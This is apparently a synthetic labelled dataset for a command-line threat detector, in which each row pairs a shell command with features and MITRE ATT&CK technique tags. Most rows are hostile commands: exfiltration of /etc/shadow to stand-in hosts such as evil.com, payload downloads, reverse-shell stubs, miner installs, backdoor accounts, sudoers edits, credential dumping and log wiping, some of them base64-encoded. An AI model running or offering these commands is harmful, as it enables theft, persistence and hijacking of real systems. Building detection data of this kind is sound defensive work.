sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1110_Brute_Force'],synthetic
"bash -c ""php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
ifconfig  -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
getent group sudo | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 | history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
"ldapsearch  -x  -b  'dc=domain,dc=com'  '(objectClass=person)'  &&  echo  done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
find / -name 'id_rsa' 2>/dev/null | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.32, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo  -u  www-data  bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
for  i  in  $(seq  1  254);  do  ping  -c1  -W1  192.168.0.$i  &>/dev/null  &&  echo  192.168.0.$i;  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
time ip link show ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
openssl  rand  -hex  16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
net user /domain,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
netstat  -tulpn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"bash -c ""rm -rf /tmp/* /var/tmp/*""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1070_Indicator_Removal'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
useradd -m -s /bin/bash -G sudo newadmin ; echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'ZG1pZGVjb2RlIC10IHN5c3RlbSA7IGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.64, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo -u www-data bash && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
sudo echo 'd21pYyB1c2VyYWNjb3VudCBsaXN0' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup Get-LocalGroupMember -Group Administrators &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggaGFja2VyICYmIGNobW9kICt4IC90bXAvcGF5bG9hZA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""echo 'R2V0LUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwIEFkbWluaXN0cmF0b3JzIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""curl -X POST http://evil.com/collect -d @/etc/shadow""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/resolv.conf && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ps aux | grep nginx &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.28, 1, 0]",['BENIGN'],synthetic
nmcli connection show && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -m -s /bin/bash -G sudo newadmin | > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZyAmJiA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
time cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.44, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
"bash -c ""curl -sL http://evil.com/shell.sh -o /tmp/shell.sh""","[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
sudo echo 'Y2F0IC9ldGMvZ3JvdXA=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -A -T4 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
echo  '@reboot  /tmp/backdoor.sh'  |  crontab  -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
"python3 -c 'import socket,subprocess,os;...'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo 'cHJvY2R1bXAuZXhlIC1tYSBsc2Fzcy5leGUgbHNhc3MuZG1w' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bG9jYXRlIHdwLWNvbmZpZy5waHA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 1]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
su -s /bin/bash www-data && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
locate wp-config.php ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1087_Account_Discovery'],synthetic
"bash -c ""adduser --shell /bin/bash --disabled-password backdoor ; echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggaGFja2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2hv' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
ls -la /root /etc /var/www && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nohup ip link show &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
arp -a ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bmMgLWUgL2Jpbi9iYXNoIGF0dGFja2VyLmNvbSA4MA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
nohup useradd -m -s /bin/bash hacker | > /dev/null 2>&1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -""","[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
hostnamectl  ;  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sha256sum /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
groups | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
"perl -e 'eval pack q/H*/, q/7363726970742e6570732f52656d6f74652e706e67/'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
sed  -i  's/old/new/g'  config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & | echo done,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo ./CVE-2021-4034 && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hostnamectl ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && history -c &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y2F0IC9ldGMvb3MtcmVsZWFzZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
